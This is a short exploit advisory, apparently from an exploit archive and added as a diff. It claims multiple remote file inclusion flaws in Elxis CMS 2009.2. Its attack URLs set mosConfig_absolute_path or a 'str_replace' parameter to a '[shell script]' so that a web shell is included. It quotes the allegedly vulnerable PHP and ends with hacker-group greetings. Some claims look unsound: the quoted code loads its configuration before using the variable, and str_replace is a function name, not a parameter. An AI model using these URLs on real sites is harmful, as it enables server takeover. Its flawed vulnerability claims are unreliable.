@@ -1,0 +1,110 @@
+###############################################
+#          _______         _______            #
+#  _______ __  __ \_______ __  __ \____  __   #
+#  __  _  \_  / / /__  __ \_  / / /__  |/_/   #
+#  _  / / // /_/ / _  / / // /_/ / __>  <     #
+#  /_/ /_/ \____/  /_/ /_/ \____/  /_/|_|     #
+#                                             #
+# priasantai.uni.cc    |    team-elite.us     #
+###############################################
+
+#######################################################
+#
+#  elxis_2009.2_electra_rev2631 <=== multiple Remote File Include
+#
+#######################################################
+# Author : n0n0x
+#
+# Homepage: http://priasantai.uni.cc/
+#
+# Download script : http://www.elxis-downloads.com/downloads/elxis-cms/272.html
+#######################################################
+
+file : index.php
+
+http://site.com/elxis-cms/index.php?mosConfig_absolute_path=[shell script]
+
+
+c0de :
+
+require_once('configuration.php');
+if (file_exists($mosConfig_absolute_path.'/installation/index.php')) {
+	if (!defined('_ELXIS_SYSALERT')) { define('_ELXIS_SYSALERT', 3); }
+	if (!defined('_ELXIS_SYSALERT_MSG')) { define('_ELXIS_SYSALERT_MSG', 'Please delete the <strong>installation</strong> folder.'); }
+	include($mosConfig_absolute_path.'/includes/systemplates/router.php');
+	exit();
+}
+
+require_once($mosConfig_absolute_path.'/includes/Core/loader.php');
+
+
+file : index2.php
+
+http://site.com/elxis-cms/index2.php?mosConfig_absolute_path=[shell script]
+
+c0de :
+
+require_once('configuration.php');
+$mosConfig_gzip = '0'; //gzip makes seo title suggestion feature to stop working
+if (file_exists($mosConfig_absolute_path.'/installation/index.php')) {
+	if (!defined('_ELXIS_SYSALERT')) { define('_ELXIS_SYSALERT', 3); }
+	if (!defined('_ELXIS_SYSALERT_MSG')) { define('_ELXIS_SYSALERT_MSG', 'Please delete the <strong>installation</strong> folder.'); }
+	include($mosConfig_absolute_path.'/includes/systemplates/router.php');
+	exit();
+}
+
+require_once( $mosConfig_absolute_path.'/includes/Core/loader.php' );
+
+file : index.php
+
+http://site.com/elxis-cms/administrator/index.php?str_replace=[shell script]
+
+c0de :
+
+/** Set flag that this is a parent file */
+define( '_VALID_MOS', 1 );
+define( '_ELXIS_ADMIN', 1 );
+
+
+$elxis_root = str_replace('/administrator', '', str_replace(DIRECTORY_SEPARATOR, '/', dirname(__FILE__)));
+require_once($elxis_root.'/includes/Core/security.php');
+
+if (!file_exists($elxis_root.'/configuration.php')) {
+	header('Location: ../installation/index.php');
+	exit();
+}
+
+require_once($elxis_root.'/configuration.php');
+require_once($elxis_root.'/includes/Core/loader.php');
+
+file : index2.php
+
+http://site.com/elxis-cms/administrator/index2.php?str_replace=[shell script]
+http://site.com/elxis-cms/administrator/index2.php?mosConfig_absolute_path=[shell script]
+
+c0de :
+
+define( '_VALID_MOS', 1 );
+define( '_ELXIS_ADMIN', 1 );
+
+$elxis_root = str_replace('/administrator', '', str_replace(DIRECTORY_SEPARATOR, '/', dirname(__FILE__)));
+require_once($elxis_root.'/includes/Core/security.php');
+
+if (!file_exists($elxis_root.'/configuration.php' )) {
+	header("Location: ../installation/index.php");
+	exit();
+}
+
+require_once($elxis_root.'/configuration.php');
+require_once($elxis_root.'/includes/Core/loader.php');
+require_once($mosConfig_absolute_path.'/administrator/includes/admin.php');
+
+
+#######################################################
+# Greetz: all member | manadocoding.org - sekuritiOnline.net - h4ckb0x.org - team-elite.us
+#
+# friends: angky.tatoki, EA ngel, bL4Ck_3n91n3, opa, xoron, pitch, thama, s0ny,
+#          devilbat, cr4wl3r, cyberl0g, lumut-, Anti_Hack, DskyMC, mr.c, doniskynet.
+#
+# chats : irc.auzs.net 6667-7000 #exploit-db
+######################################################
